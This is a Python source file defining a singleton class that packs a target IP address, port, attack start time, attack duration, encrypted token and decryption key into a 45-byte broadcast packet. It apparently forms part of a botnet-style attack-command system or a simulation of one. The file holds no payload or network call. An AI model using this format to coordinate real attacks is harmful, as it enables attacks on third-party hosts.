from app.models import singleton


@singleton
class PacketData:
    def __init__(self):
        self.clear()

    def clear(self, clearFlag=True):
        if clearFlag:
            self._flag = 0
        self._ipAddr = [0, 0, 0, 0]
        self._portNum = 0
        self._atkDate = {"year": 0, "month": 0, "day": 0, "hour": 0, "min": 0}
        self._atkDuration = 0
        self._encryptedToken = ""
        self._decryptKey = ""
        self._updateTime = None

    def printPacket(self):
        print(
            f"""[Packet Data]
Flag: {self._flag}
Ip Address: {".".join(map(str, self._ipAddr))}
Port Num: {self._portNum}
Attack Date: ({self._atkDate["year"]}/{self._atkDate["month"]}/{self._atkDate["day"]} - {self.atkDate["hour"]}:{self.atkDate["min"]})
Attack Duration: {self._atkDuration} Min
decryptKey: {"*" * 8 if self._decryptKey else None} / len: {len(self._decryptKey)}
encryptedToken: {self.encryptedToken}
"""
        )

    def getBroadcastData(self):
        data = None
        if self.flag == 1:
            data = self.flag.to_bytes(1, "big") + self.encryptedToken
        else:
            data = self.getBytes()
        return data

    def getBytes(self):
        MAX_PACKET_LEN = 45

        packet = []
        packet.extend(self.flag.to_bytes(1, "big"))
        if self.flag == 1:
            packet.extend(bytearray(self.ipAddr))
            packet.extend(self.portNum.to_bytes(2, "big"))
            packet.extend(self.atkDate["year"].to_bytes(1, "big"))
            packet.extend(self.atkDate["month"].to_bytes(1, "big"))
            packet.extend(self.atkDate["day"].to_bytes(1, "big"))
            packet.extend(self.atkDate["hour"].to_bytes(1, "big"))
            packet.extend(self.atkDate["min"].to_bytes(1, "big"))
            packet.extend(self.atkDuration.to_bytes(1, "big"))
        if self.flag == 2:
            packet.extend(self.decryptKey)

        if len(packet) < MAX_PACKET_LEN:
            packet.extend([0] * (MAX_PACKET_LEN - len(packet)))
        else:
            packet = packet[:MAX_PACKET_LEN]

        return bytes(packet)

    @property
    def flag(self):
        return self._flag

    @flag.setter
    def flag(self, value):
        if 0 <= value <= 3:
            self._flag = value

    @property
    def ipAddr(self):
        return self._ipAddr

    @ipAddr.setter
    def ipAddr(self, value):
        if len(value) == 4 and all(0 <= x <= 255 for x in value):
            self._ipAddr = value

    @property
    def portNum(self):
        return self._portNum

    @portNum.setter
    def portNum(self, value):
        if 0 <= value <= 65535:
            self._portNum = value

    @property
    def atkDate(self):
        return self._atkDate

    @atkDate.setter
    def atkDate(self, value):
        if isinstance(value, (list, tuple)) and len(value) == 5:
            keys = ["year", "month", "day", "hour", "min"]
            self._atkDate = dict(zip(keys, value))

        elif isinstance(value, dict):
            required_keys = {"year", "month", "day", "hour", "min"}
            if not required_keys.issubset(value.keys()):
                raise ValueError(f"atkDate must contain keys: {required_keys}")
            self._atkDate = value
        else:
            raise ValueError("atkDate must be a dict or a list/tuple of length 5")

    @property
    def atkDuration(self):
        return self._atkDuration

    @atkDuration.setter
    def atkDuration(self, value):
        if 0 <= value <= 31:
            self._atkDuration = value

    @property
    def decryptKey(self):
        return self._decryptKey

    @decryptKey.setter
    def decryptKey(self, value):
        self._decryptKey = value

    @property
    def encryptedToken(self):
        return self._encryptedToken

    @encryptedToken.setter
    def encryptedToken(self, value):
        self._encryptedToken = value

    @property
    def updateTime(self):
        return self._updateTime

    @updateTime.setter
    def updateTime(self, value):
        self._updateTime = value
